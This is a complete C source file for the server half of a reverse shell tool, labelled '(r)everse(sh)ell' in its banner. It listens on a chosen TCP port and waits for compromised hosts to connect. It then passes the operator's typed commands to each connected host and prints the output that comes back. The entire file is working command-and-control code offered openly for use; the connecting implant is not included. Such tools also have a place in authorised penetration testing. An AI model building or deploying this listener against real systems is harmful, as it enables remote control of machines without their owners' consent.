#include <arpa/inet.h>
#include <getopt.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <unistd.h>

static void usage(char *progname)
{
    const char *banner =
        "          _       \n"
        " _ __ ___| |__    \n"
        "| '__/ __| '_ \\  \n"
        "| |  \\__ \\ | | |\n"
        "|_|  |___/_| |_|  \n"
        "(r)everse(sh)ell\n";

    fprintf(stdout, "%s\nusage: %s [-p server_port]\n", banner, progname);
}

static int parse_args(int argc, char *argv[], in_port_t *server_port)
{
    int opt;

    while ((opt = getopt(argc, argv, "p:c:h")) != -1) {
        switch (opt) {
        case 'p':
            *server_port = htons(atoi(optarg));
            break;

        case 'h':
            return 1;
        }
    }

    if (!(*server_port))
        return 1;

    return 0;
}

static void handle_client(int client_fd)
{
    char buffer[1024];

    memset(buffer, 0, sizeof(buffer));

    /* Read the prompt */
    read(client_fd, buffer, (2 * sizeof(char)));
    fprintf(stdout, "%s", buffer);

    while (1) {
        memset(buffer, 0, sizeof(buffer));

        fgets(buffer, sizeof(buffer), stdin);

        /* Issue the command */
        write(client_fd, buffer, strlen(buffer));
        if (!strcmp(buffer, "exit\n"))
            break;

        memset(buffer, 0, sizeof(buffer));

        /* Read the result */
        while (read(client_fd, buffer, sizeof(buffer)) > 0) {
            fprintf(stdout, "%s", buffer);
            memset(buffer, 0, sizeof(buffer));
        }
    }
}

int main(int argc, char *argv[])
{
    int server_fd = 0;
    int client_fd = 0;
    struct sockaddr_in server_addr;
    struct sockaddr_in client_addr;
    socklen_t client_len = sizeof(client_addr);
    struct timeval rd_timeout;

    memset(&server_addr, 0, sizeof(struct sockaddr_in));

    /* Parse the server port. */
    if (parse_args(argc, argv, &server_addr.sin_port)) {
        usage(argv[0]);
        exit(EXIT_FAILURE);
    }

    server_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (server_fd == -1) {
        fprintf(stderr, "[-] fail to create the server socket.\n");
        exit(EXIT_FAILURE);
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = htonl(INADDR_ANY);

    rd_timeout.tv_sec = 0;
    rd_timeout.tv_usec = 200000;

    /* Set the timeout for read operations. */
    setsockopt(server_fd, SOL_SOCKET, SO_RCVTIMEO, &rd_timeout, sizeof(struct timeval));

    /* Bind the server to specified port */
    if (bind(server_fd, (struct sockaddr *)&server_addr, sizeof(struct sockaddr)) == -1) {
        fprintf(stderr, "[-] fail to bind the server to specified port\n");
        exit(EXIT_FAILURE);
    }

    if (listen(server_fd, 1) == -1) {
        fprintf(stderr, "[-] fail to configure the server to listen new connections\n");
        exit(EXIT_FAILURE);
    }

    fprintf(stdout, "[+] starting server...\n");

    while (1) {
        client_fd = accept(server_fd, (struct sockaddr *)&client_addr, &client_len);

        if (client_fd > 0) {
            fprintf(stdout, "[+] client %s connected\n", inet_ntoa(client_addr.sin_addr));
            handle_client(client_fd);
            fprintf(stdout, "[+] client %s disconnected\n", inet_ntoa(client_addr.sin_addr));
        }
    }

    close(server_fd);

    exit(EXIT_SUCCESS);
}
